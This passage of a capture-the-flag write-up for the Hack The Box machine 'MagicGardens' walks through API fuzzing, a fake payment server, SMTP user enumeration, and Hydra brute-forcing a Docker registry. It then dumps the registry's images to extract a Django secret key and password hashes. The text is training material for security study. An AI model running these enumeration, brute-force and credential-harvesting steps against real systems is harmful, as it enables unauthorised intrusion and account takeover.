┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.11.161 - - [18/May/2024 15:48:02] code 501, message Unsupported method ('POST')
10.129.11.161 - - [18/May/2024 15:48:02] "POST /api/payments/ HTTP/1.1" 501 -
```

We `fuzzed` the endpoint and found three more options.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://honestbank.htb/api/FUZZ' --fs 145 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://honestbank.htb/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

sessions                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
createAccount           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 249ms]
payments                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 915ms]
:: Progress: [220560/220560] :: Job [1/1] :: 72 req/sec :: Duration: [0:23:09] :: Errors: 7 ::
```

| Endpoint      |
| ------------- |
| sessions      |
| createAccount |
| payments      |

We tested every endpoint but it was probably a rabbit hole. At least to us it brought no value in the steps of clearing the box.

```c
POST /api/createAccount/ HTTP/1.1
Host: honestbank.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

```c
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 18 May 2024 20:05:16 GMT
Content-Type: application/json
Content-Length: 62
Connection: close
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

{"accountCode": "9125649562", "pspReference": "UD8DPQ6qQ0UK2"}
```

![](images/2024-05-18_15-15_api_burp_suite.png)

## Upgrading Subscription

We filled out all data exactly as shown on the web form as mentioned before and selected `honestbank.htb`. In the request we pointed it to our local machine where we ran the script which `Crow` thankfully provided to gave back a `HTTP/1.1 200` status code. This was required to `upgrade` the `subscription`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ cat server.py 
#!/usr/bin/python3
from flask import Flask, request, jsonify
 
app = Flask(__name__)
 
@app.route("/api/payments/", methods = ['POST'])
def pay():
    content = request.json
    print(content)
    return jsonify(
        status="200",
        message="OK",
        cardname="flask",
        cardnumber="1111-2222-3333-4444"
    ), 200


if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=True, port=80)
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ python3 server.py 
 * Serving Flask app 'server'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://10.0.2.20:80
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 411-100-633
{'cardname': 'John More Doe', 'cardnumber': '1111-2222-3333-4444', 'expmonth': 'September', 'expyear': '2026', 'cvv': '352', 'amount': 25}
10.129.11.161 - - [18/May/2024 16:27:48] "POST /api/payments/ HTTP/1.1" 200 -
```

And we got rewarded with a success message saying that our subscriptions has been upgraded and we could download a `QR Code` to get a `20% discount`.

![](images/2024-05-18_15-15_website_profile_subscription_upgrade_success.png)

![](images/2024-05-18_15-15_website_profile_subscription_download_qrcode.png)

We bought another item and after successfully purchased it, we received a message from `morty` in our `inbox`.

![](images/2024-05-18_16-33_buying.png)

![](images/2024-05-18_16-33_buying_success.png)

![](images/2024-05-18_16-34_message.png)

| Username |
| -------- |
| morty    |

## User Enumeration via SMTP Part 2

Since we got `morty` as new username, we head back to `Metasploit` and this time used another `wordlist` to check if there are other potential users we might overlooked the first time.

```c
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                          Required  Description
   ----       ---------------                                          --------  -----------
   RHOSTS     10.129.11.161                                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      25                                                       yes       The target port (TCP)
   THREADS    1                                                        yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                     yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/wordlists/seclists/Usernames/Names/names.txt  yes       The file that contains a list of probable users accounts.


View the full module info with the info, or info -d command.
```

And indeed we found another user called `alex`.

```c
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.129.11.161:25      - 10.129.11.161:25 Banner: 220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
[*] 10.129.11.161:25 - 10.129.11.161:25 Banner: 220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU) [+] 10.129.11.161:25 - 10.129.11.161:25 Users found: alex [*] magicgardens.htb:25 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed
```

| Username |
| -------- |
| alex     |

## Brute Forcing the Docker Registry

Another pretty useful technique which `Yeeb` brought into play was `Brute Forcing` the `Docker Registry` with the newly found username and also this time we got lucky and discovered his `password`.

- [https://github.com/Syzik/DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber)

```c
┌──(kali㉿kali)-[~]
└─$ hydra -l alex  -P /usr/share/wordlists/rockyou.txt 10.129.11.161 -s 5000 https-get /v2/ 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-19 08:19:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-gets://10.129.11.161:5000/v2/
[5000][http-get] host: 10.129.11.161   login: alex   password: diamonds
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-19 08:20:41
```

| Username | Password |
| -------- | -------- |
| alex     | diamonds |

We did a quick verification and moved forward to enumerate the `Docker Registry`.

```c
┌──(kali㉿kali)-[~/opt/container/DockerRegistryGrabber]
└─$ python drg.py https://magicgardens.htb -U 'alex' -P 'diamonds' --list       
[+] magicgardens.htb
```

## Foothold

### Investigating Docker API

At first we `dumped` all of the content on the `Docker Registry` to investigate the content of the `tarballs` after it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ python ~/opt/container/DockerRegistryGrabber/drg.py https://magicgardens.htb -U 'alex' -P 'diamonds' --dump_all
[+] magicgardens.htb
[+] BlobSum found 30
[+] Dumping magicgardens.htb
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c
    [+] Downloading : 748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc
    [+] Downloading : 81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515
    [+] Downloading : 35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8
    [+] Downloading : 437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1
    [+] Downloading : f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82
    [+] Downloading : d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6
    [+] Downloading : fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea
    [+] Downloading : 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb
    [+] Downloading : 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d
    [+] Downloading : 4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b
    [+] Downloading : 9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f
    [+] Downloading : d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570
```

The `tar` archive `b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c.tar.gz` caught our attention since it contained very valuable information.

```c
┌──(kali㉿kali)-[/media/…/Machines/MagicGardens/files/magicgardens.htb]
└─$ tar -xvf b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c.tar.gz
usr/
usr/src/
usr/src/app/
usr/src/app/.env
usr/src/app/app/
usr/src/app/app/__init__.py
usr/src/app/app/__pycache__/
usr/src/app/app/__pycache__/__init__.cpython-39.pyc
usr/src/app/app/__pycache__/settings.cpython-39.pyc
usr/src/app/app/__pycache__/urls.cpython-39.pyc
usr/src/app/app/__pycache__/wsgi.cpython-39.pyc
usr/src/app/app/asgi.py
usr/src/app/app/settings.py
usr/src/app/app/urls.py
usr/src/app/app/wsgi.py
usr/src/app/db.sqlite3
usr/src/app/entrypoint.sh
usr/src/app/manage.py
usr/src/app/media/
usr/src/app/media/uploads/
usr/src/app/media/uploads/carnations.jpg
usr/src/app/media/uploads/gerbera.jpg
usr/src/app/media/uploads/iris.jpg
usr/src/app/media/uploads/lilium.jpg
usr/src/app/media/uploads/lotus.jpg
usr/src/app/media/uploads/orchid.jpg
usr/src/app/media/uploads/rose.jpg
usr/src/app/media/uploads/snowdrop.jpg
usr/src/app/media/uploads/tulip.jpg
usr/src/app/media/uploads/сhrysanthemum.jpg
usr/src/app/requirements.txt
usr/src/app/static/
usr/src/app/static/admin/
usr/src/app/static/admin/css/
usr/src/app/static/admin/css/autocomplete.css
usr/src/app/static/admin/css/base.css
usr/src/app/static/admin/css/changelists.css
usr/src/app/static/admin/css/dark_mode.css
usr/src/app/static/admin/css/dashboard.css
usr/src/app/static/admin/css/forms.css
usr/src/app/static/admin/css/login.css
usr/src/app/static/admin/css/nav_sidebar.css
usr/src/app/static/admin/css/responsive.css
usr/src/app/static/admin/css/responsive_rtl.css
usr/src/app/static/admin/css/rtl.css
usr/src/app/static/admin/css/vendor/
usr/src/app/static/admin/css/vendor/select2/
usr/src/app/static/admin/css/vendor/select2/LICENSE-SELECT2.md
usr/src/app/static/admin/css/vendor/select2/select2.css
usr/src/app/static/admin/css/vendor/select2/select2.min.css
usr/src/app/static/admin/css/widgets.css
usr/src/app/static/admin/img/
usr/src/app/static/admin/img/LICENSE
usr/src/app/static/admin/img/README.txt
usr/src/app/static/admin/img/calendar-icons.svg
usr/src/app/static/admin/img/gis/
usr/src/app/static/admin/img/gis/move_vertex_off.svg
usr/src/app/static/admin/img/gis/move_vertex_on.svg
usr/src/app/static/admin/img/icon-addlink.svg
usr/src/app/static/admin/img/icon-alert.svg
usr/src/app/static/admin/img/icon-calendar.svg
usr/src/app/static/admin/img/icon-changelink.svg
usr/src/app/static/admin/img/icon-clock.svg
usr/src/app/static/admin/img/icon-deletelink.svg
usr/src/app/static/admin/img/icon-no.svg
usr/src/app/static/admin/img/icon-unknown-alt.svg
usr/src/app/static/admin/img/icon-unknown.svg
usr/src/app/static/admin/img/icon-viewlink.svg
usr/src/app/static/admin/img/icon-yes.svg
usr/src/app/static/admin/img/inline-delete.svg
usr/src/app/static/admin/img/search.svg
usr/src/app/static/admin/img/selector-icons.svg
usr/src/app/static/admin/img/sorting-icons.svg
usr/src/app/static/admin/img/tooltag-add.svg
usr/src/app/static/admin/img/tooltag-arrowright.svg
usr/src/app/static/admin/js/
usr/src/app/static/admin/js/SelectBox.js
usr/src/app/static/admin/js/SelectFilter2.js
usr/src/app/static/admin/js/actions.js
usr/src/app/static/admin/js/admin/
usr/src/app/static/admin/js/admin/DateTimeShortcuts.js
usr/src/app/static/admin/js/admin/RelatedObjectLookups.js
usr/src/app/static/admin/js/autocomplete.js
usr/src/app/static/admin/js/calendar.js
usr/src/app/static/admin/js/cancel.js
usr/src/app/static/admin/js/change_form.js
usr/src/app/static/admin/js/collapse.js
usr/src/app/static/admin/js/core.js
usr/src/app/static/admin/js/filters.js
usr/src/app/static/admin/js/inlines.js
usr/src/app/static/admin/js/jquery.init.js
usr/src/app/static/admin/js/nav_sidebar.js
usr/src/app/static/admin/js/popup_response.js
usr/src/app/static/admin/js/prepopulate.js
usr/src/app/static/admin/js/prepopulate_init.js
usr/src/app/static/admin/js/theme.js
usr/src/app/static/admin/js/urlify.js
usr/src/app/static/admin/js/vendor/
usr/src/app/static/admin/js/vendor/jquery/
usr/src/app/static/admin/js/vendor/jquery/LICENSE.txt
usr/src/app/static/admin/js/vendor/jquery/jquery.js
usr/src/app/static/admin/js/vendor/jquery/jquery.min.js
usr/src/app/static/admin/js/vendor/select2/
usr/src/app/static/admin/js/vendor/select2/LICENSE.md
usr/src/app/static/admin/js/vendor/select2/i18n/
usr/src/app/static/admin/js/vendor/select2/i18n/af.js
usr/src/app/static/admin/js/vendor/select2/i18n/ar.js
usr/src/app/static/admin/js/vendor/select2/i18n/az.js
usr/src/app/static/admin/js/vendor/select2/i18n/bg.js
usr/src/app/static/admin/js/vendor/select2/i18n/bn.js
usr/src/app/static/admin/js/vendor/select2/i18n/bs.js
usr/src/app/static/admin/js/vendor/select2/i18n/ca.js
usr/src/app/static/admin/js/vendor/select2/i18n/cs.js
usr/src/app/static/admin/js/vendor/select2/i18n/da.js
usr/src/app/static/admin/js/vendor/select2/i18n/de.js
usr/src/app/static/admin/js/vendor/select2/i18n/dsb.js
usr/src/app/static/admin/js/vendor/select2/i18n/el.js
usr/src/app/static/admin/js/vendor/select2/i18n/en.js
usr/src/app/static/admin/js/vendor/select2/i18n/es.js
usr/src/app/static/admin/js/vendor/select2/i18n/et.js
usr/src/app/static/admin/js/vendor/select2/i18n/eu.js
usr/src/app/static/admin/js/vendor/select2/i18n/fa.js
usr/src/app/static/admin/js/vendor/select2/i18n/fi.js
usr/src/app/static/admin/js/vendor/select2/i18n/fr.js
usr/src/app/static/admin/js/vendor/select2/i18n/gl.js
usr/src/app/static/admin/js/vendor/select2/i18n/he.js
usr/src/app/static/admin/js/vendor/select2/i18n/hi.js
usr/src/app/static/admin/js/vendor/select2/i18n/hr.js
usr/src/app/static/admin/js/vendor/select2/i18n/hsb.js
usr/src/app/static/admin/js/vendor/select2/i18n/hu.js
usr/src/app/static/admin/js/vendor/select2/i18n/hy.js
usr/src/app/static/admin/js/vendor/select2/i18n/id.js
usr/src/app/static/admin/js/vendor/select2/i18n/is.js
usr/src/app/static/admin/js/vendor/select2/i18n/it.js
usr/src/app/static/admin/js/vendor/select2/i18n/ja.js
usr/src/app/static/admin/js/vendor/select2/i18n/ka.js
usr/src/app/static/admin/js/vendor/select2/i18n/km.js
usr/src/app/static/admin/js/vendor/select2/i18n/ko.js
usr/src/app/static/admin/js/vendor/select2/i18n/lt.js
usr/src/app/static/admin/js/vendor/select2/i18n/lv.js
usr/src/app/static/admin/js/vendor/select2/i18n/mk.js
usr/src/app/static/admin/js/vendor/select2/i18n/ms.js
usr/src/app/static/admin/js/vendor/select2/i18n/nb.js
usr/src/app/static/admin/js/vendor/select2/i18n/ne.js
usr/src/app/static/admin/js/vendor/select2/i18n/nl.js
usr/src/app/static/admin/js/vendor/select2/i18n/pl.js
usr/src/app/static/admin/js/vendor/select2/i18n/ps.js
usr/src/app/static/admin/js/vendor/select2/i18n/pt-BR.js
usr/src/app/static/admin/js/vendor/select2/i18n/pt.js
usr/src/app/static/admin/js/vendor/select2/i18n/ro.js
usr/src/app/static/admin/js/vendor/select2/i18n/ru.js
usr/src/app/static/admin/js/vendor/select2/i18n/sk.js
usr/src/app/static/admin/js/vendor/select2/i18n/sl.js
usr/src/app/static/admin/js/vendor/select2/i18n/sq.js
usr/src/app/static/admin/js/vendor/select2/i18n/sr-Cyrl.js
usr/src/app/static/admin/js/vendor/select2/i18n/sr.js
usr/src/app/static/admin/js/vendor/select2/i18n/sv.js
usr/src/app/static/admin/js/vendor/select2/i18n/th.js
usr/src/app/static/admin/js/vendor/select2/i18n/tk.js
usr/src/app/static/admin/js/vendor/select2/i18n/tr.js
usr/src/app/static/admin/js/vendor/select2/i18n/uk.js
usr/src/app/static/admin/js/vendor/select2/i18n/vi.js
usr/src/app/static/admin/js/vendor/select2/i18n/zh-CN.js
usr/src/app/static/admin/js/vendor/select2/i18n/zh-TW.js
usr/src/app/static/admin/js/vendor/select2/select2.full.js
usr/src/app/static/admin/js/vendor/select2/select2.full.min.js
usr/src/app/static/admin/js/vendor/xregexp/
usr/src/app/static/admin/js/vendor/xregexp/LICENSE.txt
usr/src/app/static/admin/js/vendor/xregexp/xregexp.js
usr/src/app/static/admin/js/vendor/xregexp/xregexp.min.js
usr/src/app/static/store/
usr/src/app/static/store/bootstrap.css
usr/src/app/static/store/cart.png
usr/src/app/static/store/cart_dark.png
usr/src/app/static/store/catalog.png
usr/src/app/static/store/diamond.png
usr/src/app/static/store/empty.png
usr/src/app/static/store/facebook.png
usr/src/app/static/store/favicon.png
usr/src/app/static/store/heart.png
usr/src/app/static/store/heart_dark.png
usr/src/app/static/store/honestbank.png
usr/src/app/static/store/image.png
usr/src/app/static/store/instagram.png
usr/src/app/static/store/login.png
usr/src/app/static/store/logo.png
usr/src/app/static/store/logout.png
usr/src/app/static/store/messages.png
usr/src/app/static/store/plunders.png
usr/src/app/static/store/promo.jpg
usr/src/app/static/store/promo_2.png
usr/src/app/static/store/remove.png
usr/src/app/static/store/remove_dark.png
usr/src/app/static/store/search.png
usr/src/app/static/store/staff.png
usr/src/app/static/store/star.png
usr/src/app/static/store/twitter.png
usr/src/app/static/store/upgrade.png
usr/src/app/static/store/yourmomsbank.png
usr/src/app/static/store/youtube.png
usr/src/app/store/
usr/src/app/store/__init__.py
usr/src/app/store/__pycache__/
usr/src/app/store/__pycache__/__init__.cpython-39.pyc
usr/src/app/store/__pycache__/admin.cpython-39.pyc
usr/src/app/store/__pycache__/apps.cpython-39.pyc
usr/src/app/store/__pycache__/models.cpython-39.pyc
usr/src/app/store/__pycache__/urls.cpython-39.pyc
usr/src/app/store/__pycache__/utils.cpython-39.pyc
usr/src/app/store/__pycache__/views.cpython-39.pyc
usr/src/app/store/admin.py
usr/src/app/store/apps.py
usr/src/app/store/migrations/
usr/src/app/store/migrations/0001_initial.py
usr/src/app/store/migrations/0002_storemessage_attachment.py
usr/src/app/store/migrations/0003_alter_storemessage_attachment.py
usr/src/app/store/migrations/0004_alter_storemessage_attachment.py
usr/src/app/store/migrations/__init__.py
usr/src/app/store/migrations/__pycache__/
usr/src/app/store/migrations/__pycache__/0001_initial.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0002_product_price.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0002_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0003_alter_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0003_rename_rank_product_rating.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0004_alter_product_rating.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0004_alter_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0005_product_stock.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0006_storeuser.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0007_rename_name_storeuser_username_storeuser_first_name_and_more.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0008_alter_storeuser_email.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0009_alter_storeuser_status.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0010_alter_storeuser_password.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0011_rename_second_name_storeuser_last_name.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0012_order.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0013_alter_order_user.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0014_order_date.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0015_storemessage.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0016_rename_receive_from_storemessage_received_from_and_more.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0017_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0018_alter_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/0019_remove_storemessage_attachment.cpython-39.pyc
usr/src/app/store/migrations/__pycache__/__init__.cpython-39.pyc
usr/src/app/store/models.py
usr/src/app/store/static/
usr/src/app/store/static/store/
usr/src/app/store/static/store/bootstrap.css
usr/src/app/store/static/store/cart.png
usr/src/app/store/static/store/cart_dark.png
usr/src/app/store/static/store/catalog.png
usr/src/app/store/static/store/diamond.png
usr/src/app/store/static/store/empty.png
usr/src/app/store/static/store/facebook.png
usr/src/app/store/static/store/favicon.png
usr/src/app/store/static/store/heart.png
usr/src/app/store/static/store/heart_dark.png
usr/src/app/store/static/store/honestbank.png
usr/src/app/store/static/store/image.png
usr/src/app/store/static/store/instagram.png
usr/src/app/store/static/store/login.png
usr/src/app/store/static/store/logo.png
usr/src/app/store/static/store/logout.png
usr/src/app/store/static/store/messages.png
usr/src/app/store/static/store/plunders.png
usr/src/app/store/static/store/promo.jpg
usr/src/app/store/static/store/promo_2.png
usr/src/app/store/static/store/remove.png
usr/src/app/store/static/store/remove_dark.png
usr/src/app/store/static/store/search.png
usr/src/app/store/static/store/staff.png
usr/src/app/store/static/store/star.png
usr/src/app/store/static/store/twitter.png
usr/src/app/store/static/store/upgrade.png
usr/src/app/store/static/store/yourmomsbank.png
usr/src/app/store/static/store/youtube.png
usr/src/app/store/templates/
usr/src/app/store/templates/store/
usr/src/app/store/templates/store/cart.html
usr/src/app/store/templates/store/catalog.html
usr/src/app/store/templates/store/check.html
usr/src/app/store/templates/store/detail.html
usr/src/app/store/templates/store/footer.html
usr/src/app/store/templates/store/header.html
usr/src/app/store/templates/store/index.html
usr/src/app/store/templates/store/login.html
usr/src/app/store/templates/store/message.html
usr/src/app/store/templates/store/profile.html
usr/src/app/store/templates/store/register.html
usr/src/app/store/templates/store/restore.html
usr/src/app/store/templates/store/search.html
usr/src/app/store/templates/store/wish_list.html
usr/src/app/store/urls.py
usr/src/app/store/utils.py
usr/src/app/store/views.py
```

First of all we checked `settings.py` for more information about the application.

```c
┌──(kali㉿kali)-[/media/…/Machines/MagicGardens/files/magicgardens.htb]
└─$ cat usr/src/app/app/settings.py
from pathlib import Path
from decouple import config
import os

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = config('SECRET_KEY')

DEBUG = config('DEBUG', default=False, cast=bool)

ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'store',
    'qr_code'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'app.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'app.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
    }
}

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_TZ = True

SESSION_ENGINE  = 'django.contrib.sessions.backends.signed_cookies'
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
SESSION_COOKIE_HTTPONLY = False

STATIC_URL = 'static/'
STATIC_ROOT = os.path.join(BASE_DIR, 'static/')

MEDIA_URL = 'media/'
MEDIA_ROOT = os.path.join(BASE_DIR, 'media/')

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
```

We found a hint about `Python Pickle` which lead us to a potential `Python Pickle Deserialization Attack`.

```c
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
```

We also found a `db.sqlite3` file located in `/usr/src/app`. A quick `strings` revealed two nice `hashes`.

```c
┌──(kali㉿kali)-[/media/…/magicgardens.htb/usr/src/app]
└─$ strings db.sqlite3 | grep pbkdf
pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=2023-06-06 17:34:56.520750morty2023-06-06 17:32:24
mortyMortySmithmorty@mail.htbpbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=48219612Seattle, WashingtonStaff
```

Not enough the `.env` file contained the `SECRET_KEY` mentioned earlier in the `settings.py`.

```c
┌──(kali㉿kali)-[/media/…/magicgardens.htb/usr/src/app]
└─$ ls -la  
total 188
drwxrwx--- 1 root vboxsf    142 Aug 28  2023 .
drwxrwx--- 1 root vboxsf      6 Aug 28  2023 ..
-rwxrwx--- 1 root vboxsf     97 Aug 11  2023 .env
drwxrwx--- 1 root vboxsf    108 Aug 11  2023 app
-rwxrwx--- 1 root vboxsf 176128 Aug 11  2023 db.sqlite3
-rwxrwx--- 1 root vboxsf    156 Aug 11  2023 entrypoint.sh
-rwxrwx--- 1 root vboxsf    561 Aug 11  2023 manage.py
drwxrwx--- 1 root vboxsf     14 Aug 11  2023 media
-rwxrwx--- 1 root vboxsf     77 Aug 11  2023 requirements.txt
drwxrwx--- 1 root vboxsf     20 Aug 11  2023 static
drwxrwx--- 1 root vboxsf    188 Aug 11  2023 store
```

```c
┌──(kali㉿kali)-[/media/…/magicgardens.htb/usr/src/app]
└─$ cat .env 
DEBUG=False
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b
```

| Secret Key                                                                 |
| -------------------------------------------------------------------------- |
| 55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b |

### Cracking the Hash

Loaded with these information we started attempting to crack the found hashes.

```c
